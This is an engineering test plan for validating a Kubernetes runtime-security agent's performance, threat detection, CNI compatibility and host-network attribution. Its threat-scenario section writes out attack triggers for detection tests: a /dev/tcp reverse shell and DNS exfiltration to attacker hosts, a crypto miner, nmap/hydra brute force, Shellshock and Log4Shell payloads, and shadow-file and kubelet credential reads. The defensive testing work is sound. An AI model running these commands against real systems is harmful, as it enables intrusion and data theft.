# Hardware-bound validation plan

Four roadmap items can't be finished without real Kubernetes infrastructure:

| ID | Work item                          | Why hardware is needed                                                                |
|----|------------------------------------|---------------------------------------------------------------------------------------|
| E1 | Performance baseline + load tests  | dp's overhead numbers only mean something under sustained, realistic packet load.    |
| E3 | Threat scenario e2e expansion      | Threat detection must be validated against actual exec/network/DLP/WAF traffic.       |
| A4 | CNI compatibility matrix           | NFQUEUE behaviour differs per CNI; can only be verified by running on each.           |
| C2 | Host-network pod attribution       | Needs a cluster to confirm the bug, then verify the eBPF probe fix.                   |

This document specifies the hardware, the per-item task list, and the success criteria
for each. It exists so that once cluster access is provisioned the work is straight
execution against a written contract — no design churn at run time.

---

## 1. Hardware specifications

Two cluster shapes cover everything. Spec 1 ("dev cluster") is sufficient for E1, E3,
C2, and three of the four CNI permutations in A4. Spec 2 ("cloud matrix") is only
needed for the managed-CNI rows of A4.

### Spec 1 — single-VM dev cluster (covers E1 / E3 / C2 / three of A4)

| Resource          | Minimum                | Recommended                | Why                                                                            |
|-------------------|------------------------|----------------------------|--------------------------------------------------------------------------------|
| vCPU              | 12                     | 16                         | dp pins one core per pod under load; need headroom for fortio + the agent.    |
| RAM               | 24 GB                  | 32 GB                      | hyperscan compiled DPI signatures + flow table + dp's per-session buffers.    |
| Disk              | 100 GB NVMe            | 200 GB NVMe                | docker layers + audit DB + ~10GB/h of pcap + flow logs at peak.               |
| Kernel            | ≥ 5.15 with BTF         | ≥ 6.1                      | CO-RE eBPF probes + NFQUEUE + tc act_mirred. Ubuntu 22.04+ ships these.       |
| Network           | NAT or bridge OK       | bridge with IPv4 forward   | kind / k3d clusters on the same VM; no public ingress needed.                 |
| Outbound          | docker.io, ghcr.io, quay.io | + grafana.com           | Pull base images + Grafana dashboards.                                        |

A bare-metal box, a beefy laptop, or a single cloud VM (AWS `m6i.4xlarge` ≈ $0.77/h,
GCE `n2-standard-16` similar) all qualify. I do NOT need root on the host — I do need
`docker` socket access (or sudoless docker via the `docker` group).

### Spec 2 — cloud matrix clusters (only A4's EKS/GKE/AKS rows need this)

Three managed clusters, each tiny:

- **EKS** — 2 t3.medium nodes, 1.30+, default aws-vpc-cni. ~$0.10/h.
- **GKE** — 2 e2-medium nodes, 1.30+, default GKE-CNI. ~$0.10/h.
- **AKS** — 2 Standard_B2s nodes, 1.30+, default azure-cni. ~$0.10/h.

Run for ~6 hours total during the matrix exercise; $2-5 in cluster spend if managed
correctly. The matrix can also be deferred to a customer engagement that already has
clusters in those clouds — no need to provision dedicated infra if real customer
clusters are accessible.

### What I need from you when the box is ready

- SSH / shell access (interactive or sudoless `docker`)
- A directory I can write to (≥ 50 GB free)
- Either `kind` and `k3d` pre-installed, or permission to `apt install` them
- For Spec 2 only: kubeconfig contexts for each cloud cluster

I do NOT need: persistent volumes, cluster ingress, public DNS, customer data, or
production access.

---

## 2. E1 — Performance baseline + load testing

**Goal.** Quantify the overhead constellation imposes per pod under sustained load,
identify the throughput knee where flow ingest backs up, and publish the numbers in
`docs/perf-baseline.md` so customer SREs can size their clusters.

**Hardware.** Spec 1. Single VM, `kind` cluster with 1 control plane + 3 workers.

**Pre-flight.**

- [ ] kind cluster up: `kind create cluster --config deploy/e2e/perf/kind.yaml`
- [ ] Calico installed (NFQUEUE-compatible CNI): `kubectl apply -f https://docs.projectcalico.org/manifests/calico.yaml`
- [ ] `make image-runtime-agent` succeeds on the host; image loaded into kind:
      `kind load docker-image ghcr.io/alphabravocompany/constellation-runtime-agent:<v>`
- [ ] `make image-api` similarly loaded
- [ ] `helm install constellation deploy/charts/constellation -f deploy/perf/values.yaml`
      (values file written as part of task 1 below)
- [ ] `kubectl get pods -n constellation-system` — all running

**Tasks.**

1. **Write `deploy/e2e/perf/values.yaml`** and `deploy/e2e/perf/kind.yaml`. Wire
   resource limits matching customer-typical sizing (api: 1 core / 2 GB; agent: 2
   cores / 4 GB; dp implicit via privileged daemonset). Disable optional features
   (registry walker, GitOps drift) so the measurement is the runtime path only.

2. **Deploy fortio sender/receiver pairs.** Use `fortio` (the istio-standard load
   generator). Three traffic profiles:
   - **Light:** 1k req/s HTTP/1.1, small payloads (closest to a typical microservice mesh).
   - **Heavy:** 50k pps mixed TCP + UDP (closest to a payment processor).
   - **Spiky:** 1k → 50k → 1k pps step ladder, holds 5 minutes per step.

3. **Baseline run — no agent.** Disable the runtime-agent DaemonSet. Measure for 30
   minutes per profile: p50/p95/p99 RTT, packet loss %, CPU on the sender/receiver pods,
   network saturation per node.

4. **Constellation run — agent on.** Re-enable the DaemonSet. Repeat the same 30 min
   per profile. Capture additionally: dp CPU/RSS, agent CPU/RSS, NFQUEUE drop count
   (`/proc/net/netfilter/nfnetlink_queue`), flow ingest backlog
   (`network_flows_pending` if exposed; otherwise wallclock skew between flow `at` and
   row `created_at`).

5. **Threat detection under load.** During the heavy profile, exec into a sender pod
   and run a known-detected pattern (e.g. `curl 'http://victim/?id=1 OR 1=1'`). Verify
   the WAF threat fires within 1s. Repeat at the spiky-peak step.

6. **Policy enforcement under load.** Promote one policy to `enforce` mid-test;
   verify NFQUEUE blocks the denied flows AND the legitimate traffic isn't affected.
   Measure the deny-path RTT vs. allow-path RTT.

7. **Failure-mode tests.**
   - Kill dp mid-test. Verify `--queue-bypass` lets traffic through (fail-open).
   - Saturate the api ingest endpoint. Verify the agent's local buffer absorbs the gap
     and flushes when api recovers.
   - Disconnect the agent from the api (`iptables -A OUTPUT -d <api-svc> -j DROP`).
     Verify dp keeps running and the agent's queue grows until disconnect lifts.

8. **Write `docs/perf-baseline.md`.** Single-page table:
   | Profile | Baseline p99 | Agent p99 | Overhead | dp CPU | dp RSS | Ingest lag p99 | Notes |

**Success criteria.**

- [ ] All 3 profiles run cleanly through 30 min each, with and without agent.
- [ ] Overhead p99 RTT < 500 µs at the light profile.
- [ ] Heavy profile: dp CPU < 2 cores per node; flow ingest lag p99 < 5s.
- [ ] Spiky profile: no flow drops at peak; backlog drains in < 30s post-peak.
- [ ] Threat alerts fire within 1s under heavy load.
- [ ] Failure-mode tests all behave as designed (fail-open / buffer-then-flush).
- [ ] `docs/perf-baseline.md` published with the table + a paragraph per profile.

**Effort.** 3 days of run time + analysis once the cluster is up.

---

## 3. E3 — Threat scenario e2e expansion

**Goal.** Make every threat-class our agent claims to detect produce a passing scenario
in `deploy/e2e/threat-scenarios/`, runnable by `make e2e-threats`, with each scenario
asserting the expected alerts fire within an expected time window.

**Hardware.** Spec 1, reuses the E1 cluster.

**Pre-flight.**

- [ ] Cluster from E1 still running (or restart with the same values)
- [ ] `deploy/e2e/threat-scenarios/INDEX.md` audited: which scenarios exist, which are
      skeletons, which are passing today
- [ ] CI-side: a `make e2e-threats` target that orchestrates apply → wait → assert →
      cleanup for each scenario

**Current state.** The directory already has 10 scenarios:

```
01-image-scan          02-admission-unsigned  03-admission-privileged
04-admission-tls       05-waf-sqli            06-dlp-pii
07-runtime-exec        08-gitops-drift        09-netpolicy-autogen
10-audit-chain
```

Most need an `assertions.yaml` + `expected/*.yaml` to be runnable end-to-end. E3
finishes them and adds the missing threat classes.

**Tasks.**

1. **Audit existing scenarios.** For each of 01-10, classify as `passing | partial |
   skeleton` based on what's in the directory. Write `e2e-threats-status.md` with the
   table.

2. **Build the runner.** New `scripts/run-e2e-threats.sh` that:
   - Takes a scenario directory
   - Applies `setup.yaml` (deploys victim + attacker workloads)
   - Sleeps the `warmup_seconds` from `assertions.yaml`
   - Applies `trigger.yaml` (executes the attack)
   - Polls `/api/v1/runtime-threats` (or whichever ingest endpoint each test expects)
     until either expected-alerts-seen or timeout
   - Diffs the observed alerts against `expected/*.yaml`
   - Cleans up the namespace on success or leaves it on failure (for debugging)

3. **Fill in skeleton scenarios.** For each scenario classified `skeleton`, write the missing files.
   The four most important ones not yet covered end-to-end:
   - **Reverse shell exec** — exec a `bash -i >& /dev/tcp/attacker/4444 0>&1`,
     expect `runtime.alert.exec` with the shell-back pattern.
   - **Crypto miner pattern** — deploy a pod with `xmrig` in args; expect a
     `runtime.alert.exec` and a DPI signature hit on the stratum protocol.
   - **Lateral movement (port scan + brute force)** — `nmap -p- victim` followed by
     `hydra -L users -P passwords`. Expect a `runtime.alert.exec` for hydra + a
     network policy violation for the scan.
   - **DNS exfil** — repeated `dig <base64-data>.attacker.example.com` from a
     production-tagged pod. Expect a DLP signature hit on the long-subdomain pattern.

4. **Add 4 new threat classes**:
   - **05a — WAF RCE** (HTTP body `(){:;};` Shellshock or `${jndi:ldap://}` Log4Shell)
   - **06a — DLP egress** (POST containing AWS access key to an external host)
   - **07a — Container escape attempt** (`/proc/1/root/etc/shadow` read,
     `unshare`/`setns` syscalls)
   - **07b — Kubelet credential theft** (curl to `https://kubelet:10250/runningpods`
     from a non-system pod)

5. **False-positive baseline.** Run the cluster with the threat scenarios paused for
   1 hour of `fortio` background traffic. Expected output: zero threat alerts. Any
   alert seen is documented as a known false-positive in
   `docs/threat-detection-fp.md`.

6. **CI integration.** Make `make e2e-threats` callable from a GitHub Actions runner
   with a kind cluster. The runner spins up a cluster, loads the images, deploys
   constellation, runs the matrix, tears down. ~20 min total wall time.

**Success criteria.**

- [ ] All 14 scenarios (10 existing + 4 new) green via `make e2e-threats`
- [ ] Each green run produces alerts within the asserted time window
- [ ] False-positive run: 0 spurious alerts in 1 h of fortio traffic
- [ ] `docs/e2e-results.md` and `docs/e2e-k3s-results.md` updated with the new runs
- [ ] CI workflow file `.github/workflows/e2e-threats.yml` committed

**Effort.** 4 days. Most of the work is in the trigger payloads and the polling
assertions, not the framework itself.

---

## 4. A4 — CNI compatibility matrix

**Goal.** Publish `docs/cni-compat.md` with one row per CNI we claim to support,
verified by actual test runs on each. Each row covers: CNI detection works, NFQUEUE
enforcement works (or correctly degrades to monitor-only), and where applicable the
Cilium-native policy export gets enforced by Cilium itself.

**Hardware.** Spec 1 for kindnet / Calico / Cilium / Cilium-chains-Calico permutations.
Spec 2 (cloud matrix) for aws-vpc / GKE-cni / azure-cni rows.

**Pre-flight.**

- [ ] kind ≥ 0.22 (`kind --version`)
- [ ] kubectl 1.30+
- [ ] cilium-cli 0.16+ for the Cilium permutations
- [ ] calicoctl 3.27+ for the Calico permutations
- [ ] For Spec 2: kubeconfig contexts named `eks-test`, `gke-test`, `aks-test`

**Tasks.**

For each of these CNI environments, the same per-CNI checklist runs:

```
CNI permutations
├── A. kindnet                                  (kind default)
├── B. flannel                                  (k3d default; --no-kindnet on kind)
├── C. calico                                   (kind with kindnet disabled + Calico install)
├── D. cilium                                   (kind with cilium-cli install)
├── E. cilium chaining calico                   (the gnarly one)
├── F. aws-vpc-cni                              (EKS, Spec 2)
├── G. gke-cni                                  (GKE, Spec 2)
└── H. azure-cni                                (AKS, Spec 2)
```

Per-CNI checklist:

1. **Bring up cluster** with the CNI installed and ready (`kubectl get nodes` shows Ready).
2. **Mount /etc/cni/net.d** into a runtime-agent pod; verify our detector reports the
   expected CNI name in `kubectl logs <agent-pod> | grep "CNI detected"`.
3. **Install runtime-agent DaemonSet.** Verify dp comes up healthy.
4. **NFQUEUE enforcement test.** Deploy a policy in `enforce` mode that denies
   `victim → attacker`. Send traffic. For Flannel/Calico: assert traffic is dropped.
   For Cilium pure-eBPF: assert traffic flows (NFQUEUE is bypassed) but the agent logs
   the bypass and the policy stays in `monitor` mode automatically.
5. **Cilium-native export test (D, E only).** `GET /api/v1/runtime-policies/{id}/export?flavor=cilium`,
   `kubectl apply` the result, re-run the traffic. Assert Cilium drops it via
   CiliumNetworkPolicy.
6. **Caveats discovered during testing get documented per-row.** Examples: "GKE needs
   `--container-image-source` flag; AKS NSGs interact with NFQUEUE rules; Cilium's
   chaining mode requires `cilium.io/cni-priority` annotation."

**Tasks for the docs side:**

1. **Write `docs/cni-compat.md`** with the table:
   | CNI | Detection | NFQUEUE Enforce | Cilium Native Export | Test Cluster | Notes |
2. **Cluster-spec snippets.** One `.yaml` per CNI under `deploy/e2e/cni-matrix/`
   so the next operator can re-run the matrix.
3. **CI runnability.** Three of the eight (A, C, D) can run in GitHub Actions kind.
   Document the rest as "manual run on customer-typical clusters."

**Success criteria.**

- [ ] All 8 rows have a passing detection + enforcement run with evidence (logs,
      kubectl outputs, screen-recordings)
- [ ] `docs/cni-compat.md` published
- [ ] Three of eight (kindnet, Calico, Cilium) run in CI
- [ ] Two new CI workflow files: `.github/workflows/cni-calico.yml` and
      `.github/workflows/cni-cilium.yml`

**Effort.** 5 days. Most work is laborious cluster bring-up + waiting, not coding.

---

## 5. C2 — Host-network pod attribution

**Goal.** When a pod runs with `hostNetwork: true`, its flows currently get labelled
with the host's MAC and we can't tell which pod made them. Fix: a small eBPF probe
that traces socket creates per-PID, plus a Go-side stitcher that joins dp's flow
records to the probe's (PID → cgroup → pod) lookup.

**Hardware.** Spec 1, very small cluster. One control plane + one worker is enough.
This is mostly design + eBPF + verification, not load.

**Pre-flight.**

- [ ] Same kind/k3d cluster as E1 works
- [ ] Kernel ≥ 5.15 with `bpftool`, `clang-14+`, `libbpf-dev`
- [ ] Existing eBPF probes at `internal/runtime/ebpf/bpf/` compile cleanly

**Tasks.**

1. **Reproduce the bug.** Deploy a hostNetwork pod (`tools/netshoot:latest`,
   `hostNetwork: true`, do `curl example.com`). Observe in network_flows:
   `src_workload` is the node, not the pod. Document the gap in
   `docs/c2-hostnetwork-attribution-design.md`.

2. **Design the probe.** Two attachment points:
   - `kprobe/inet_sock_set_state` — fires on TCP state transitions, gives us
     `(saddr, sport, daddr, dport, pid)` for ESTABLISHED transitions.
   - `tracepoint/syscalls/sys_enter_connect` — alternative, but doesn't give SYN-RECV
     for accepted sockets.

   We go with the kprobe + a fallback `tracepoint/sock/inet_sock_set_state` for kernels
   that don't allow the kprobe.

3. **Implement the probe** under
   `internal/runtime/ebpf/bpf/hostnetwork_attribution.bpf.c`. Output records via a
   perf event array consumed by the Go agent. Records carry:
   `(pid, cgroup_id, saddr, sport, daddr, dport, ts)`.

4. **Cgroup → pod resolver.** Walk `/sys/fs/cgroup/.../<cgroup_id>` → derive container
   ID → kubelet `/pods` REST endpoint or CRI socket → pod name + namespace.
   `internal/runtime/cgroupmap/cgroupmap.go` (new).

5. **Stitcher.** When dp emits a `DPMsgConnect` with the host's MAC, the Go side
   looks up the (5-tuple, time) in the probe's ring buffer (60-second sliding window)
   and rewrites `src_workload` to the resolved pod. Falls back to the host name if no
   match.

6. **Test.** Deploy hostNetwork pod, generate flow, verify network_flows row carries
   the correct `src_workload`. Negative test: non-hostNetwork pod's flows still
   attribute correctly (regression guard).

7. **Performance.** Probe + stitch add ~1-2% CPU at the heavy-traffic profile.
   Measure during E1's heavy profile re-run.

**Success criteria.**

- [ ] Before: hostNetwork pod flows attribute to the node
- [ ] After: same flows attribute to the pod
- [ ] Non-hostNetwork pod flows are unaffected
- [ ] Probe + stitcher add < 3% CPU at E1's heavy profile
- [ ] `docs/c2-hostnetwork-attribution-design.md` documents the approach
- [ ] Unit tests for the cgroup → pod resolver
- [ ] Integration test in `deploy/e2e/threat-scenarios/11-hostnetwork-attribution/`

**Effort.** 6 days. eBPF work is real, and the stitcher needs careful handling of the
ring-buffer-window lookup.

---

## 6. Suggested order of operations

E1 and E3 share a cluster, so do them back-to-back. C2 can run on the same cluster
afterwards. A4 cloud rows are the only thing needing different infrastructure.

```
Day 1     Spec 1 cluster up. E1 pre-flight + helm install.
Day 2-4   E1 task 1-8. Publish docs/perf-baseline.md.
Day 5-8   E3 task 1-6. Publish updated e2e docs.
Day 9-14  C2 task 1-7. Publish design doc + integration test.
Day 15-19 A4 local rows (A-E) on the same cluster.
Day 20-22 A4 cloud rows (F-H) on Spec 2 clusters.
Day 23    Tidy + final doc passes.
```

Sequential: ~3 weeks of focused work. Parallelizable if more than one operator is
running it; A4 cloud rows can run independently.

## 7. What's NOT in this plan

- **Customer load profiles.** Numbers measured here are synthetic. Once a customer
  is at GA, we re-run E1 against a copy of their traffic shape (anonymized) and
  publish a per-customer baseline.
- **Multi-tenant scale.** Validating the multi-cluster fan-in (D2) at 100 clusters
  is a separate effort that needs cloud infrastructure beyond what this doc covers.
- **Compliance audit-ready evidence.** The E2 audit-log mappings produce evidence;
  packaging it into ATO-ready bundles is its own follow-up.
- **HA failover testing.** Killing api replicas mid-traffic, postgres failover, etc.
  Would re-use the E1 cluster but needs more nodes and a separate test plan.

## 8. Status

| Item | Status         | Owner | Cluster ready? | ETA after cluster |
|------|----------------|-------|----------------|--------------------|
| E1   | Plan written   | Claude | ☐             | 3 days             |
| E3   | Plan written   | Claude | ☐             | 4 days             |
| A4   | Plan written   | Claude | ☐ + cloud      | 5 days             |
| C2   | Plan written   | Claude | ☐             | 6 days             |
